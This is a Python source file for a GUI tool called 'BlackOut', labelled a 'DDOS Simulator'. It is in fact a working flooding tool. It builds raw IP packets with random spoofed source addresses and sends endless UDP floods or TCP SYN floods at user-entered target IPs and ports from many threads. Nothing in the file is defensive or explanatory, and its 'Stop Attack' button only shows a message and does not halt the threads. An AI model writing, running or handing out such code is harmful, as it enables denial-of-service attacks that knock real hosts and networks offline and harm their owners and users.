import threading
import socket
import random
import struct
import tkinter as tk
from tkinter import messagebox, font

# Colors
BG_COLOR = '#121212'
FG_COLOR = '#FF0000'
TEXT_COLOR = 'white'

# Global packet counter
packets_sent = 0

# Packet craft functions
def random_ip():
    return f"{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def checksum(data):
    if len(data) % 2 == 1:
        data += b'\0'
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return (~s) & 0xffff

def build_ip_header(src_ip, dst_ip, proto):
    ip_ver = 4
    ip_ihl = 5
    ip_tos = 0
    ip_tot_len = 20 + 20 + 1024
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = 64
    ip_proto = proto
    ip_check = 0
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(dst_ip)

    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len,
                            ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
                            ip_saddr, ip_daddr)
    ip_check = checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len,
                            ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
                            ip_saddr, ip_daddr)
    return ip_header

def build_udp_packet(src_ip, dst_ip, dst_port, packet_size):
    ip_header = build_ip_header(src_ip, dst_ip, socket.IPPROTO_UDP)
    src_port = random.randint(1024, 65535)
    udp_len = 8 + packet_size
    udp_check = 0
    udp_header = struct.pack('!HHHH', src_port, dst_port, udp_len, udp_check)
    data = random._urandom(packet_size)
    return ip_header + udp_header + data

def build_tcp_packet(src_ip, dst_ip, dst_port, packet_size):
    ip_header = build_ip_header(src_ip, dst_ip, socket.IPPROTO_TCP)
    src_port = random.randint(1024, 65535)
    seq = 0
    ack_seq = 0
    doff = 5
    flags = 2  # SYN flag
    window = socket.htons(5840)
    check = 0
    urg_ptr = 0
    tcp_header = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq,
                             doff << 4, flags, window, check, urg_ptr)
    data = random._urandom(packet_size)
    return ip_header + tcp_header + data

def attack(target_ip, target_port, attack_type, packet_size):
    global packets_sent
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        print("⚠️ Run as root/admin")
        exit()

    while True:
        try:
            src_ip = random_ip()
            if attack_type == "UDP":
                packet = build_udp_packet(src_ip, target_ip, target_port, packet_size)
            else:
                packet = build_tcp_packet(src_ip, target_ip, target_port, packet_size)
            sock.sendto(packet, (target_ip, 0))
            packets_sent += 1
        except Exception as e:
            print(f"Error: {e}")

# GUI functions
def start_attack():
    global packets_sent
    packets_sent = 0  # Reset counter on every start
    targets = target_entry.get().split(",")
    port = int(port_entry.get())
    attack_type = attack_type_var.get()
    packet_size = int(packet_size_entry.get())
    threads_count = int(threads_entry.get())
    duration = int(duration_entry.get())

    for target in targets:
        for _ in range(threads_count):
            thread = threading.Thread(target=attack, args=(target.strip(), port, attack_type, packet_size), daemon=True)
            thread.start()

    # Timer to stop attack after specified duration
    if duration > 0:
        root.after(duration * 1000, stop_attack)
    messagebox.showinfo("Started", "🔥 Attack Started!")

def stop_attack():
    messagebox.showinfo("Stop", "Attack Stopped!")

def update_counter_label():
    packets_sent_label.config(text=f"Packets Sent: {packets_sent}")
    root.after(500, update_counter_label)

# GUI setup
root = tk.Tk()
root.title("DDOS Simulator")
root.configure(bg=BG_COLOR)

# Custom Font for Title
title_font = font.Font(family="Helvetica", size=36, weight="bold")

# BlackOut Title
title_label = tk.Label(root, text="BlackOut", font=title_font, bg=BG_COLOR, fg=FG_COLOR)
title_label.pack(pady=15)

# Target IPs
tk.Label(root, text="Target IPs (comma separated):", bg=BG_COLOR, fg=TEXT_COLOR).pack(pady=5)
target_entry = tk.Entry(root, width=50, bg=BG_COLOR, fg=FG_COLOR, insertbackground=FG_COLOR)
target_entry.pack()

# Port
tk.Label(root, text="Port:", bg=BG_COLOR, fg=TEXT_COLOR).pack(pady=5)
port_entry = tk.Entry(root, width=20, bg=BG_COLOR, fg=FG_COLOR, insertbackground=FG_COLOR)
port_entry.pack()

# Attack Type
tk.Label(root, text="Attack Type:", bg=BG_COLOR, fg=TEXT_COLOR).pack(pady=5)
attack_type_var = tk.StringVar(value="UDP")
tk.OptionMenu(root, attack_type_var, "UDP", "TCP").pack()

# Packet Size
tk.Label(root, text="Packet Size (bytes):", bg=BG_COLOR, fg=TEXT_COLOR).pack(pady=5)
packet_size_entry = tk.Entry(root, width=20, bg=BG_COLOR, fg=FG_COLOR, insertbackground=FG_COLOR)
packet_size_entry.pack()

# Threads per Target
tk.Label(root, text="Threads per Target:", bg=BG_COLOR, fg=TEXT_COLOR).pack(pady=5)
threads_entry = tk.Entry(root, width=20, bg=BG_COLOR, fg=FG_COLOR, insertbackground=FG_COLOR)
threads_entry.pack()

# Attack Duration
tk.Label(root, text="Attack Duration (seconds):", bg=BG_COLOR, fg=TEXT_COLOR).pack(pady=5)
duration_entry = tk.Entry(root, width=20, bg=BG_COLOR, fg=FG_COLOR, insertbackground=FG_COLOR)
duration_entry.pack()

# Start and Stop Buttons
start_button = tk.Button(root, text="🔥 Start Attack", command=start_attack, bg=FG_COLOR, fg=BG_COLOR)
start_button.pack(pady=5)

stop_button = tk.Button(root, text="🛑 Stop Attack", command=stop_attack, bg=FG_COLOR, fg=BG_COLOR)
stop_button.pack(pady=5)

# Packets Sent Counter Label
packets_sent_label = tk.Label(root, text="Packets Sent: 0", bg=BG_COLOR, fg='lime', font=('Helvetica', 14, 'bold'))
packets_sent_label.pack(pady=10)

# Start updating counter
update_counter_label()

root.mainloop()
